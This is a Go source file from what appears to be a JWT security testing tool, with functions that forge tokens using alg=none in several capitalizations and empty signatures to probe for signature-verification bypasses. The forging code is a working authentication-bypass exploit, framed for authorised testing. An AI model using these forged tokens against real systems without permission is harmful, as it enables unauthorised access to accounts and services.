// Package exploit provides standalone JWT security exploit functions. Each
// function takes an existing token string and returns one or more modified
// token strings that test a specific vulnerability.
//
// Exploits are derived from jwt_tool (https://github.com/ticarpi/jwt_tool)
// and the broken-authentication scanners in vulnapi
// (https://github.com/cerberauth/vulnapi). Use these only against systems
// you own or have explicit written permission to test.
package exploit

import (
	jwtpkg "github.com/cerberauth/jwtop/jwt"
	"github.com/cerberauth/jwtop/jwt/editor"
	jwtlib "github.com/golang-jwt/jwt/v5"
)

// AlgNoneVariants lists every capitalization of "none" that is worth testing.
// Some JWT libraries accept these case-insensitively, which lets an attacker
// bypass signature verification entirely.
var AlgNoneVariants = []string{"none", "NONE", "None", "nOnE"}

// noneMethod is a signing method that produces an empty signature and reports
// the algorithm as an arbitrary caller-supplied string. This allows producing
// tokens with alg=NONE, alg=None, etc., which are rejected by a correctly
// configured server but accepted by libraries that do case-insensitive alg
// matching.
type noneMethod struct{ alg string }

func (m *noneMethod) Alg() string                                    { return m.alg }
func (m *noneMethod) Sign(_ string, _ interface{}) ([]byte, error)   { return []byte{}, nil }
func (m *noneMethod) Verify(_ string, _ []byte, _ interface{}) error { return nil }

// AlgNone returns a copy of the token with alg=none and an empty signature.
// Use this to test whether the server rejects tokens signed with the standard
// "none" algorithm.
func AlgNone(tokenString string) (string, error) {
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return "", err
	}
	return te.WithAlgNone()
}

// AlgNoneAll returns one modified token for every entry in AlgNoneVariants,
// each using the corresponding capitalization of "none" in the alg header
// field. This covers the full set of bypass attempts commonly attempted by
func AlgNoneAll(tokenString string) ([]string, error) {
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return nil, err
	}

	claims := jwtpkg.NewOrderedMapClaims(te.GetToken())
	results := make([]string, 0, len(AlgNoneVariants))

	for _, variant := range AlgNoneVariants {
		tok := jwtlib.NewWithClaims(&noneMethod{alg: variant}, claims)
		s, err := tok.SignedString(struct{}{})
		if err != nil {
			return nil, err
		}
		results = append(results, s)
	}

	return results, nil
}
